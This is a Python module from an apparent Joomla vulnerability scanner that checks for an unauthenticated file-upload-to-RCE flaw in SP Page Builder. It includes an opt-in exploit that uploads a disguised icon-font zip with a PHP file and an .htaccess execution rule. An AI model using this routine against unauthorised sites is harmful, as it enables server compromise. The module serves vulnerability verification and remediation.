from __future__ import annotations

import io
import re
import urllib.parse
import zipfile

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import build_multipart, normalize_url, poll_paths, request
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import rand_str
from ...core.versions import version_in_specifier

CVE_ID = "CVE-2026-48908"
NAME = "SP Page Builder unauthenticated custom font upload to RCE"
COMPONENT = "SP Page Builder"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "SP Page Builder versions 1.0.0 through 6.6.1"
FIXED_RULE = "SP Page Builder 6.6.2 or later"
UPLOAD_ENDPOINT = "/index.php?option=com_sppagebuilder&task=custom_icon.upload"
PUBLIC_ICONFONT_DIR = "/media/com_sppagebuilder/assets/iconfont/"


def affected_sppagebuilder(version: str | None) -> bool:
    return bool(version_in_specifier(version, ">=1.0.0,<=6.6.1"))


def make_icon_zip(package: str, payload_filename: str, payload_content: str, use_htaccess: bool = False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f"{package}/selection.json", '{"IcoMoonType":"selection"}')
        zf.writestr(f"{package}/style.css", "/* ProofCMS lab icon package */")
        zf.writestr(f"{package}/fonts/{package}.ttf", b"\x00\x01\x00\x00")
        zf.writestr(f"{package}/fonts/{payload_filename}", payload_content)
        if use_htaccess:
            zf.writestr(f"{package}/fonts/.htaccess", "AddType application/x-httpd-php .PHP\n")
    return buf.getvalue()


def passive_result(plugins: dict | None) -> Finding:
    sppb = (plugins or {}).get("sppagebuilder", {})
    found = bool(sppb.get("found"))
    version = sppb.get("version")
    source = sppb.get("source") or "unknown"

    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="SP Page Builder was not detected via component route or manifests.",
            action="Component not detected via standard public routes; verify manually if installed at another route.",
        )

    if not version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"SP Page Builder was detected at {source}, but its version could not be determined.",
            action=f"Manually verify SP Page Builder version. Fixed version: {FIXED_RULE}.",
        )

    if affected_sppagebuilder(version):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=(
                f"SP Page Builder {version} is in the affected range for unauthenticated "
                "custom icon package upload."
            ),
            action=f"Upgrade SP Page Builder to {FIXED_RULE} and inspect media iconfont directories.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="PATCHED",
        confidence="HIGH",
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"SP Page Builder {version} is outside the affected range.",
        action=f"Keep SP Page Builder at {FIXED_RULE}.",
    )


def upload_package(base: str, package: str, zip_name: str, zip_bytes: bytes, timeout: int, proxy: str | None):
    content_type, body = build_multipart(
        {"title": "ProofCMS Lab Test"},
        {"custom_icon": (zip_name, zip_bytes, "application/zip")},
    )
    return request(
        f"{base}{UPLOAD_ENDPOINT}",
        method="POST",
        headers={"Content-Type": content_type},
        data=body,
        timeout=timeout,
        proxy=proxy,
    )


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    package = f"jvh-sppb-{rand_str(8)}"
    payload_content, expected_product = generate_php_math_payload()
    attempts = [
        ("direct .php", "marker.php", False),
        ("direct .PHP", "marker.PHP", False),
        (".htaccess+.PHP", "marker.PHP", True),
    ]
    accepted = []
    proof_notes = []

    for method, payload_filename, use_htaccess in attempts:
        zip_name = f"{package}.zip"
        zip_bytes = make_icon_zip(package, payload_filename, payload_content, use_htaccess=use_htaccess)
        upload = upload_package(base, package, zip_name, zip_bytes, timeout, proxy)
        public_root = f"{base}{PUBLIC_ICONFONT_DIR}"
        quoted_package = urllib.parse.quote(package)
        quoted_payload = urllib.parse.quote(payload_filename)
        proof_candidates = [
            (
                f"{public_root}{quoted_package}/fonts/{quoted_payload}",
                f"{package}/fonts/{payload_filename}",
            ),
            (
                f"{public_root}{quoted_package}/{quoted_package}/fonts/{quoted_payload}",
                f"{package}/{package}/fonts/{payload_filename}",
            ),
            (
                f"{public_root}fonts/{quoted_payload}",
                f"fonts/{payload_filename}",
            ),
        ]
        url_map = {url: name for url, name in proof_candidates}
        proof, found_url, attempts_count = poll_paths(
            lambda u: request(u, timeout=timeout, proxy=proxy),
            list(url_map.keys()),
            deadline=3.0,
            initial_delay=0.1,
            accept_fn=lambda candidate: any(
                verify_php_execution(candidate.get("body", ""), expected_product)
            ),
        )
        if upload.get("status") in (200, 201, 204):
            accepted.append(f"{method}: upload {upload.get('status')}, proof {proof.get('status') if proof else 0} after {attempts_count} attempt(s)")
        if proof and proof.get("status") == 200 and found_url:
            uploaded_name = url_map.get(found_url, payload_filename)
            body = proof.get("body", "")
            snippet = re.sub(r"\s+", " ", body[:80]).strip()
            is_executed, is_source = verify_php_execution(body, expected_product)
            proof_notes.append(
                f"{method}@{uploaded_name}: proof_len={len(body)}, attempts={attempts_count}, "
                f"executed={is_executed}, has_php={is_source}, snippet={snippet!r}"
            )
            if is_executed:
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE",
                    confidence="CONFIRMED",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=found_url,
                    uploaded_filename=uploaded_name,
                    detail=f"Aggressive lab upload executed dynamic PHP proof ({expected_product}) via {method} after {attempts_count} attempt(s).",
                    action=(
                        f"Remove {package} under media/com_sppagebuilder/assets/iconfont/, "
                        f"inspect for compromise, and upgrade to {FIXED_RULE}."
                    ),
                )
            if is_source or "<?php" in body.lower():
                return Finding(
                    cve=CVE_ID,
                    name=NAME,
                    status="VULNERABLE_UPLOAD_ONLY",
                    confidence="HIGH",
                    component=COMPONENT,
                    affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT,
                    exploit_ran=True,
                    proof_url=found_url,
                    uploaded_filename=uploaded_name,
                    detail=f"File write confirmed via {method} (verified in {attempts_count} attempt(s)), but PHP execution was not confirmed (source code served).",
                    action=f"Remove {package} and upgrade SP Page Builder to {FIXED_RULE}.",
                )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        uploaded_filename=package,
        detail=(
            "Aggressive lab upload did not confirm execution. "
            f"Observed attempts: {'; '.join(accepted) if accepted else 'no accepted uploads observed'}. "
            f"Proof notes: {'; '.join(proof_notes) if proof_notes else 'no proof bodies returned'}."
        ),
        action=f"If any package was written, remove {package}. Upgrade SP Page Builder to {FIXED_RULE}.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires aggressive lab-only upload verification."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.2.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": ["sppagebuilder"],
        "references": [
            "https://www.joomshaper.com/downloads/extension/sp-page-builder-pro",
        ],
    }
